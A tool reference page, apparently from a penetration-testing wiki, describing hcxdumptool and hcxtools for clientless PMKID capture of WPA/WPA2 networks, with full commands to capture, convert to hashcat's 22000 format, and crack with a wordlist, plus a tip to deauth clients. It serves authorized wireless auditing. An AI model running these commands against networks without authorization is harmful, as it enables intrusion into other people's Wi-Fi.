# hcxdumptool & hcxtools (PMKID Capture)

> Capture WPA/WPA2 material — often a **PMKID from the AP alone, no clients
> needed** — and convert it into a hash hashcat can crack.

- **Link:** hcxdumptool https://github.com/ZerBea/hcxdumptool · hcxtools https://github.com/ZerBea/hcxtools
- **Type:** open source
- **Platform:** Linux

## Description

The PMKID attack (Steube, 2018) changed WPA2-PSK auditing: many access points
volunteer a PMKID in the first message of the handshake, so you can grab
crackable material *without waiting for a client to connect or deauthing anyone*.
`hcxdumptool` does the on-air capture; `hcxpcapngtool` (from the `hcxtools`
package) converts the resulting `.pcapng` into the `hc22000` hash format that
[hashcat](../password-cracking/hashcat.md) mode `-m 22000` cracks. It still
captures full 4-way handshakes too, so it's a strict upgrade over the classic
airodump-ng capture in many cases.

## Installation

```bash
sudo apt install hcxdumptool hcxtools        # Debian/Kali/Ubuntu
```

## Usage examples

### Capture with hcxdumptool

```bash
# Capture PMKIDs and handshakes on wlan0 into a pcapng file
# (recent hcxdumptool manages monitor mode itself — no airmon-ng needed)
sudo hcxdumptool -i wlan0 -w capture.pcapng

# Restrict to specific target BSSIDs/channels via a filter file
sudo hcxdumptool -i wlan0 -w capture.pcapng --bpf=filter.bpf
```

### Convert with hcxpcapngtool

```bash
# Convert the capture to hashcat's 22000 format
hcxpcapngtool -o hashes.hc22000 capture.pcapng

# Also dump any ESSIDs seen, for context
hcxpcapngtool -o hashes.hc22000 -E essids.txt capture.pcapng
```

### Crack with hashcat

```bash
# WPA-PBKDF2-PMKID+EAPOL — the unified WPA mode
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt
```

## Notes & references

- Mode **22000** replaced the older 16800 (PMKID) and 2500 (handshake) modes —
  one format now covers both.
- PMKID capture is **clientless**: it works against the AP even when no one is
  connected, unlike the [Aircrack-ng](aircrack-ng.md) handshake workflow.
- Not every AP exposes a PMKID; when none appears, fall back to capturing a full
  handshake (deauth a client to speed it up).
- Filter to your authorized targets — a broad capture will sweep up neighbours'
  networks.
- Cracking guidance and wordlists: [hashcat](../password-cracking/hashcat.md),
  [wordlists](../password-cracking/wordlists.md).
- Background: https://hashcat.net/forum/thread-7717.html
